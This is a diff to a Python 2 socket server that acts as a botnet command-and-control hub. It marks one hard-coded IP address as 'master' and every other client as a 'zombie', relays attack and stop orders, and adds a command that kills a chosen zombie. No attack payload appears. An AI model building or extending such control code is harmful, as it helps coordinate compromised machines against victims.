@@ -1,6 +1,6 @@
 import socket
 import thread
-
+import re
 class SocketServer(socket.socket):
     clients = []
 
@@ -29,7 +29,7 @@ class SocketServer(socket.socket):
         while 1:
             (clientsocket, address) = self.accept()
             #Adding client to clients list
-            if address[0] == "192.168.25.3":
+            if address[0] == "192.168.25.11" or address[0] == "127.0.0.1":
                 role = "master"
             else:
                 role = "zombie"
@@ -100,7 +100,7 @@ class BasicChatServer(SocketServer):
         data = message.rstrip()
         #List of zombies connected
         if data == "list":
-            print "Retrieving zombie list to Master"
+            print "Retrieving list of zombies to master"
             list = self.listzombies()
             client.send(list)
         #Sending attack message to zombies
@@ -113,6 +113,12 @@ class BasicChatServer(SocketServer):
             print "Master sent stop order"
             self.broadcast(message)
             client.send("Attack mode interrupted\n")
+
+        elif data.startswith("kill"):
+            zombie_id = data.strip()[-1]
+            print "Killing zombie " + zombie_id
+            zombie = self.clients[int(zombie_id)][0]
+            zombie.send("die")
 
         return data != "die"
 
